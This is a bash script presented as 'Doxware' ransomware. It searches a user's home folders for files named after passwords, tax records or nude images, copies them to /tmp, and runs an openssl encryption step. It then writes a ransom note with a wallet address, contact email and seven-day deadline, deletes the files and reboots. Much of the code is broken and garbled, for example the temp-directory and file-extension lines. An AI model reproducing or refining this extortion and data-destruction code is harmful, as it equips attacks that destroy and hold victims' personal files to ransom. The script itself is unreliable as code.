#!/bin/bash

# -------------------------- TARGET IDENTIFICATION --------------------------
# Check for common encryption keys
if grep -q "key=123456" /etc/passwd; then
  TARGET_FILE="/home/$USER/Documents/"
  KEYWORD_PRIORITY="0.5"
elif grep -q "key=789012" /etc/passwd; then
  TARGET_FILE="/home/$USER/Pictures/"
  KEYWORD_PRIORITY="0.3"
else
  TARGET_FILE="/home/$USER/Desktop/"
  KEYWORD_PRIORITY="0.6"
fi

# List files to scan - using find for speed and efficiency
SCAN_FILES=$(find "$TARGET_FILE" -maxdepth 1 -type f | awk '{print $MFN}' | grep -i -E "(\$keyword\|confidential\|password|nude|tax)" )

# Create a variable based on the number of files to scan
NUM_FILES=$(( $(echo "$SCAN_FILES" | wc -l) + 1 ))


# Check for errors or if nothing was found.
if [[ -z "$SCAN_FILES" ]]; then
  echo "No target files found!"
  exit 0
fi

# -------------------------- STAGING --------------------------
# Create a temporary directory
TMPDIR=$(mkdir -p /tmp/doxwear-cache2024 | ls -tr | tail -n 1)

# Copy identified files into the temporary directory
find "$TARGET_FILE" -maxdepth 1 -type f -print0 | xargs -I {} cp -f "{}" "$TMPDIR/" > /dev/null 2>&1


# -------------------------- ENCRYPTION & EXFILTRATION --------------------------

# Generate unique file extension (e.g., .mrcpy)
FILE_EXT=$RANDOM$shuf -e ".mrcpy".txt"

# Prepare encryption key (random)
KEY=$(head /dev/urandom | tr -d '\n' | head -c 16)

# Encrypt the target files using AES-256 in CBC mode, with a salt
ENCRYPTED_FILE="$TARGET_FILE.$FILE_EXT"
AESKEY=$KEY

# Check if file exists
if ! [[ -f "$TARGET_FILE" ]]; then
  echo "File not found: $TARGET_FILE"
  exit 1
fi

# Encrypt the target file (using OpenSSL)
openssl aes-256-cbc -k "$AESKEY" -salt 1 -in "$TARGET_FILE" -out "$ENCRYPTED_FILE" > /dev/null 2>&1

# Check if encryption was successful
if ! [[ -f "$ENCRYPTED_FILE" ]]; then
  echo "Encryption failed!"
  exit 1
fi


# Create the ransom note (using cat and redirection)
NOTES=/tmp/doxwear-ransom.mrcpy.txt
cat <<EOF > "$NOTES"
##################################
# DOXWEAR RANSOMWARE BY #
# THE DARK SHEPHERD        #
##################################

File: $TARGET_FILE

Encryption Algorithm: AES-256/CBC

Key (16 Bytes): $KEY

Price for Decryption: 0.1 ETH (or 10,000 Dogecoin)

Payment Address:
0x43968d77eE5f35BbeEa94A7237C3F25587820f5d

Contact Us: shepherddoxwear@bitpanda.com for help

Deadline to Pay: 7 Days (or files are permanently lost!)
EOF


# Rename the file extension
sed -i "s/\$FILE_EXT$/.txt/g" "$NOTES"

# Make sure it's a .txt, if not replace with .pdf
if [[ ! "$NOTES" =~ \.txt$ ]]; then
  cp "$NOTES" "$TARGET_FILE.pdf" > /dev/null 2>&1
fi

# Log the action and create a file list
echo "File: $TARGET_FILE encrypted successfully!" >> /var/log/doxwear-logs.txt
echo "Ransom Note saved to: $NOTES"
echo "Key saved in: $TMPDIR/$KEY.txt"


# -------------------------- NOTIFICATION & REBOOT --------------------------

# Display a notification (using zenity - if installed)
if command -p zenity > /dev/null 2>&1; then
  zenity --notification \
    --title="Doxware Ransome" \
    --text="$FILE_EXT or files are permanently lost. Price: 0.1 ETH or 10,000 Dogecoin." \
    --icon=information
fi

# Reboot the system for best encryption results
echo "Restarting Files (to ensure AES is applied) ...\n\n..."
find "$TARGET_FILE" -type f -print0 | xargs -0 rm > /dev/null 2>&1
echo "System Rebooting to Ensure High Encryption Performance...\n\n..."
reboot


# -------------------------- END PROGRAM --------------------------
